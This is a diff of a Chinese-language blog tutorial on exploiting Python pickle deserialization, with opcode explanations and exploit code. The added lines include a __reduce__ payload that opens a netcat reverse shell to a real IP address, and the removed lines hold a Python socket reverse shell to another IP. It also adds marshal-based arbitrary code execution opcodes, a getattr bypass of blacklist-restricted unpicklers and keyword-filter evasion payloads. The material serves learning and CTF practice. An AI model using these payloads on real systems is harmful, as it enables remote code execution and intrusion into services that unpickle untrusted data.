@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hoylindo || Python反序列化（一）</title>
+    <title>Hoylindo || Python反序列化</title>
     <meta name="author" content="hoylindo">
     <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
     <meta name="keywords" content=" ">
@@ -153,14 +153,14 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>Python反序列化（一） </h1>
+        <h1>Python反序列化 </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
             </span>
-            2022/11/12
+            2023/2/12
         </span>
 
         
@@ -183,7 +183,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/Python" style=color:#ffa2c4>
+                <a href="/tags/Python" style=color:#1bccbc>
                     Python
                 </a>
             </span>
@@ -197,7 +197,7 @@
 
 <span id="more"></span>
 
-<h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
 <li>Python中有两个模块可以实现对象的序列化，<code>pickle</code>和<code>cPickle</code>，区别在于<code>cPickle</code>是用C语言实现的，<code>pickle</code>是用纯python语言实现的，用法类似，cPickle的读写效率高一些；使用时一般先尝试导入cPickle，如果失败，再导入pickle模块</li>
 <li>pickle的应用场景一般有以下几种：<ul>
 <li> 在解析认证token，session的时候（尤其web中使用的redis、mongodb、memcached等来存储session等状态信息）</li>
@@ -290,7 +290,7 @@
 <td>无</td>
 </tr>
 <tr>
-<td>R</td>
+<td><strong>R</strong></td>
 <td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
 <td>R</td>
 <td>函数和参数出栈，函数的返回值入栈</td>
@@ -311,7 +311,7 @@
 <td>无</td>
 </tr>
 <tr>
-<td>t</td>
+<td><strong>t</strong></td>
 <td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
 <td>t</td>
 <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
@@ -421,6 +421,14 @@
 <li><p><strong>拼接opcode：</strong>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可</p>
 </li>
 </ul>
+<h3 id="大白话版"><a href="#大白话版" class="headerlink" title="大白话版"></a>大白话版</h3><ul>
+<li><code>c</code>：以c开始的后面两行的作用类似<code>os.system</code>的调用，其中<code>cos</code>在第一行，<code>system</code>在第二行</li>
+<li><code>(</code>：相当于左括号</li>
+<li><code>t</code>：相当于右括号</li>
+<li><code>S</code>：表示本行的内容一个字符串</li>
+<li><code>R</code>：执行紧靠自己左边的一个括号对（即<code>(</code> 和<code>t</code>之间）的内容</li>
+<li><code>.</code>：代表该pickle结束</li>
+</ul>
 <h3 id="序列化与反序列化分析"><a href="#序列化与反序列化分析" class="headerlink" title="序列化与反序列化分析"></a>序列化与反序列化分析</h3><ul>
 <li><p>字符串：</p>
 <pre><code class="python">import pickle
@@ -528,11 +536,11 @@ pickletools.dis(a)
 </li>
 </ul>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><ul>
-<li><p>有一个文件<code>flag.py</code>，内容如下：<code>flag = &#39;hao ye!&#39;</code></p>
+<li><p>有一个文件<code>secret.py</code>，内容如下：<code>flag = &#39;hao ye!&#39;</code></p>
 </li>
 <li><p>现在要把它修改成<code>lalala</code>，需要通过<code>c</code>操作符得到全局变量<code>flag</code>，然后利用<code>b</code>操作符修改属性值即可，构造payload如下：</p>
 <pre><code class="python">c__main__
-flag
+secret
 (S&#39;flag&#39;
 S&#39;lalala&#39;
 db.
@@ -540,28 +548,30 @@ db.
 </li>
 <li><p>代码：</p>
 <pre><code class="python">import pickle
-import flag
+import secret
 payload = &#39;&#39;&#39;c__main__
-flag
+secret
 (S&#39;flag&#39;
 S&#39;lalala&#39;
 db.&#39;&#39;&#39;
 
-print(&#39;before:&#39;, flag.flag)
+print(&#39;before:&#39;, secret.flag)
 # print(payload.encode())
 output = pickle.loads(payload.encode())
 print(&#39;output:&#39;, output)
-print(&#39;after:&#39;, flag.flag)
+print(&#39;after:&#39;, secret.flag)
 </code></pre>
 </li>
 <li><p>分析：</p>
 <ul>
-<li>通过 <code>c</code> 获取全局变量 <code>secret</code> ，然后建立一个字典，并使用 <code>b</code> 对<code>secret</code>进行属性设置</li>
+<li>通过 <code>c</code> 获取全局变量 <code>flag</code> ，然后建立一个字典，并使用 <code>b</code> 对<code>flag</code>进行属性设置</li>
 </ul>
 </li>
 </ul>
 <h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul>
-<li><p><code>__reduce__</code>方法：被定义之后，当对象被pickle时就会触发，作用：如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle，如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用</p>
+<li><p><code>__reduce__</code>方法：类似php中的<code>__wakeup()</code>方法，被定义之后，当对象被反序列化时就会触发，作用：如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle，如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用</p>
+</li>
+<li><p><code>pickle.loads</code>可以解决import 问题，对于未引入的<code>module</code>会自动尝试<code>import</code>，也就是说整个python标准库的代码执行、命令执行函数都可以使用</p>
 </li>
 <li><p>如：</p>
 <pre><code class="python">import os
@@ -577,16 +587,13 @@ print(payload)
 pickle.loads(payload)
 </code></pre>
 </li>
-<li><p>？实现反弹shell：</p>
+<li><p>实现反弹shell：</p>
 <pre><code class="python">import os
 import pickle
 
 class Test(object):
     def __reduce__(self):
-        b = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((
-        &quot;124.222.255.142&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(
-        [&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;
-        return os.system, (b,)
+        return (eval, (&quot;__import__(&#39;os&#39;).system(&#39;nc 43.143.175.158 6666 -e/bin/sh&#39;)&quot;,))
 
 a = Test()
 payload = pickle.dumps(a)
@@ -642,7 +649,7 @@ pickle.loads(payload)
 <li>字符<code>.</code>，结束反序列化</li>
 </ul>
 </li>
-<li><p>利用代码：</p>
+<li><p>利用代码（python3）：</p>
 <pre><code class="python">import pickle
 
 class Test:
@@ -654,9 +661,275 @@ b = pickle.loads(a)
 </code></pre>
 </li>
 </ul>
+<h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><ul>
+<li><p><code>pickle</code>不能序列化代码对象，但是自从 python 2.6 起，Python 提供了一个可以序列化code对象的模块<code>Marshal</code>，如：</p>
+<pre><code class="python">import pickle
+import marshal
+import base64
+
+def code():
+    import os
+    os.system(&#39;whoami&#39;)
+
+code_pickle = base64.b64encode(marshal.dumps(code.func_code))
+print code_pickle
+</code></pre>
+</li>
+<li><p>利用PVM操作码构造执行输出的base64内容，Python 能通过 <code>types.FunctionTyle(func_code,globals(),&#39;&#39;)()</code> 来动态地创建匿名函数：</p>
+<pre><code class="python">code_str = base64.b64decode(code_pickle)
+code = marshal.loads(code_str)
+func = types.FunctionType(code, globals(), &#39;&#39;)
+func()
+# 可以简写为：
+(types.FunctionType(marshal.loads(base64.b64decode(code_pickle)), globals(), &#39;&#39;))()
+</code></pre>
+</li>
+<li><p>构造对应的PVM操作语句：</p>
+<pre><code class="python">import pickle
+
+s = &quot;&quot;&quot;ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S&#39;YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////90BgAAAHdob2FtaSgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAQAAACgAAAAAKAAAAABzLQAAAEQ6XFB5Y2hhcm1Qcm9qZWN0c1xweXRob25Qcm9qZWN0MVxwaWNrbGVcMS5weXQEAAAAY29kZQYAAABzBAAAAAABDAE=&#39;
+tRtRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.
+&quot;&quot;&quot;
+
+pickle.loads(s)
+</code></pre>
+</li>
+<li><p>生成payload脚本：</p>
+<pre><code class="python">import marshal
+import base64
+
+def code():
+    pass # any code here
+
+print &quot;&quot;&quot;ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S&#39;%s&#39;
+tRtRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(code.func_code))
+</code></pre>
+</li>
+</ul>
+<h2 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul>
+<li><p>官方给出的安全反序列化是继承了<code>pickle.Pickler</code>类，并重载了<code>find_class</code>方法</p>
+</li>
+<li><p>常见的是设置了一些黑名单来进行绕过，如：</p>
+<pre><code class="python">import pickle
+import io
+import builtins
+__all__ = (&#39;PickleSerializer&#39;,)
+class RestrictedUnpickler(pickle.Unpickler):
+    blacklist=&#123;&#39;eval&#39;,&#39;exec&#39;,&#39;open&#39;,&#39;__import__&#39;,&#39;exit&#39;,&#39;input&#39;&#125;
+    def find_class(self,module,name):
+        if module == &quot;builtins&quot; and name not in self.blacklist:
+            return getattr(builtins,name)
+        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot;%(module ,name))
+</code></pre>
+</li>
+<li><p>禁用<code>eval</code>和<code>exec</code>等函数，但<code>getattr</code>没有被ban，可以通过<code>builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)</code>来获取<code>eval</code>等黑名单函数</p>
+</li>
+<li><p>构造payload：</p>
+<pre><code class="python">builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)
+# 构造序列化后的字符串
+cbuiltins
+getattr  # 构造出builtins.getattr
+(cbuiltins
+dict
+S&#39;get&#39;  #获取到globals中的dict类中的get方法
+tR(cbuiltins
+globals   #得到globals()
+(tRS&#39;builtins&#39; #读取builtins
+tRS&#39;eval&#39;
+tRp1
+(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;
+tR.&quot;&quot;&quot;
+</code></pre>
+</li>
+</ul>
+<h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><ul>
+<li><p>V操作符绕过：<code>(S&#39;flag&#39;</code>可以换成<code>(V\u0066lag</code></p>
+</li>
+<li><p>十六进制绕过：<code>S</code>操作符可以识别十六进制，因此可以对字符进行十六进制编码：<code>(S&#39;\x66lag&#39;</code></p>
+</li>
+<li><p>内置函数获取关键字：</p>
+<ul>
+<li><p>通过<code>sys.modules[xxx]</code>来获取全部属性，然后输出：</p>
+<pre><code class="python">import secret
+import sys
+print(dir(sys.modules[&#39;secret&#39;]))
+</code></pre>
+</li>
+<li><p>这里是列表的形式(pickle不支持列表索引)，所以用函数<code>reversed()</code>将列表反序，然后用<code>next()</code>函数指向关键词从而实现输出关键词：</p>
+<pre><code class="python">import secret
+import sys
+print(next(reversed(dir(sys.modules[&#39;secret&#39;]))))
+</code></pre>
+</li>
+<li><p>构造序列化后的字符串并验证：</p>
+<pre><code class="python">import pickle
+import secret
+
+opcode = b&#39;&#39;&#39;(((c__main__
+secret
+i__builtin__
+dir
+i__builtin__
+reversed
+i__builtin__
+next
+.&#39;&#39;&#39;
+print(pickle.loads(opcode))
+</code></pre>
+</li>
+<li><p>成功输出flag，新的变量覆盖payload：</p>
+<pre><code class="python">import pickle
+import secret
+
+payload = b&#39;&#39;&#39;c__main__
+secret
+((((c__main__
+secret
+i__builtin__
+dir
+i__builtin__
+reversed
+i__builtin__
+next
+S&#39;lalala&#39;
+db.&#39;&#39;&#39;
+print(&#39;before:&#39;, secret.flag)
+output = pickle.loads(payload)
+print(&#39;output:&#39;, output)
+print(&#39;after:&#39;, secret.flag)
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="pker的使用"><a href="#pker的使用" class="headerlink" title="pker的使用"></a>pker的使用</h2><ul>
+<li><p>pker是以仿照Python的形式产生<code>pickle opcode</code>的解析器，可以用来进行原变量覆盖、函数执行、实例化新的对象</p>
+</li>
+<li><p>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</p>
+<pre><code class="python">以下module都可以是包含&#39;.&#39;的子module
+调用函数时，注意传入的参数类型要和示例一致
+对应的opcode会被生成，但并不与pker代码相互等价
+
+GLOBAL
+对应opcode：b&#39;c&#39;
+获取module下的一个全局对象（没有import的也可以，比如下面的os）：
+GLOBAL(&#39;os&#39;, &#39;system&#39;)
+输入：module,instance(callable、module都是instance)  
+
+INST
+对应opcode：b&#39;i&#39;
+建立并入栈一个对象（可以执行一个函数）：
+INST(&#39;os&#39;, &#39;system&#39;, &#39;ls&#39;)  
+输入：module,callable,para 
+
+OBJ
+对应opcode：b&#39;o&#39;
+建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
+OBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;ls&#39;) 
+输入：callable,para
+
+xxx(xx,...)
+对应opcode：b&#39;R&#39;
+使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）
+
+li[0]=321
+或
+globals_dic[&#39;local_var&#39;]=&#39;hello&#39;
+对应opcode：b&#39;s&#39;
+更新列表或字典的某项的值
+
+xx.attr=123
+对应opcode：b&#39;b&#39;
+对xx对象进行属性设置
+
+return
+对应opcode：b&#39;0&#39;
+出栈（作为pickle.loads函数的返回值）：
+return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
+</code></pre>
+</li>
+<li><p>由于opcode本身的功能问题，pker不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行，但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>，即<code>查值不行，赋值可以</code></p>
+</li>
+<li><p>pker解析<code>S</code>时，用单引号包裹字符串，所以pker代码中的双引号会被解析为单引号opcode：</p>
+<pre><code class="python">test=&quot;123&quot;
+return test   ---&gt;  b&quot;S&#39;123&#39;\np0\n0g0\n.&quot;
+</code></pre>
+</li>
+</ul>
+<h4 id="全局变量覆盖-1"><a href="#全局变量覆盖-1" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><pre><code class="python">secret=GLOBAL(&#39;__main__&#39;, &#39;secret&#39;)
+secret.flag=&#39;lalala&#39;                 ---&gt;  b&quot;c__main__\nsecret\np0\n0g0\n(&#125;(S&#39;flag&#39;\nS&#39;lalala&#39;\ndtb.&quot;
+</code></pre>
+<h4 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h4><ul>
+<li><p>通过<code>b&#39;R&#39;</code>调用：</p>
+<pre><code class="python">s=&#39;whoami&#39;
+system = GLOBAL(&#39;os&#39;, &#39;system&#39;)
+system(s) # `b&#39;R&#39;`调用
+return
+</code></pre>
+</li>
+<li><p>通过<code>b&#39;i&#39;</code>调用：</p>
+<pre><code class="python">INST(&#39;os&#39;, &#39;system&#39;, &#39;whoami&#39;)
+</code></pre>
+</li>
+<li><p>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</p>
+<pre><code class="python">OBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;whoami&#39;)
+</code></pre>
+</li>
+<li><p>多参数调用函数：</p>
+<pre><code class="python">INST(&#39;[module]&#39;, &#39;[callable]&#39;[, par0,par1...])
+OBJ(GLOBAL(&#39;[module]&#39;, &#39;[callable]&#39;)[, par0,par1...])
+</code></pre>
+</li>
+<li><p>还有一个要注意的就是有的时候生成的opcode末尾没有<code>.</code>，就会报错</p>
+</li>
+</ul>
+<h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><ul>
+<li><p>实例化对象是一种特殊的函数执行：</p>
+<pre><code class="python">animal = INST(&#39;__main__&#39;, &#39;Animal&#39;,&#39;1&#39;,&#39;2&#39;)
+return animal
+# 或
+animal = OBJ(GLOBAL(&#39;__main__&#39;, &#39;Animal&#39;), &#39;1&#39;,&#39;2&#39;)
+return animal
+# 也可以先实例化再赋值：
+animal = INST(&#39;__main__&#39;, &#39;Animal&#39;)
+animal.name=&#39;1&#39;
+animal.category=&#39;2&#39;
+return animal
+</code></pre>
+</li>
+<li><p>原文件中需包含：</p>
+<pre><code class="python">class Animal:
+
+    def __init__(self, name, category):
+        self.name = name
+        self.category = category
+</code></pre>
+</li>
+</ul>
+<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><pre><code class="shell">python3 pker.py &lt; 1.txt
+</code></pre>
 <p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1782/#toc_pickle">Python pickle反序列化浅析</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436#toc-12">pickle反序列化初探</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436#toc-12">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1782/#toc_v">Python pickle反序列化浅析 - 跳跳糖 (tttang.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/103143526">浅谈python反序列化漏洞_LetheSec的博客-CSDN博客</a></p>
 
     </div>
 
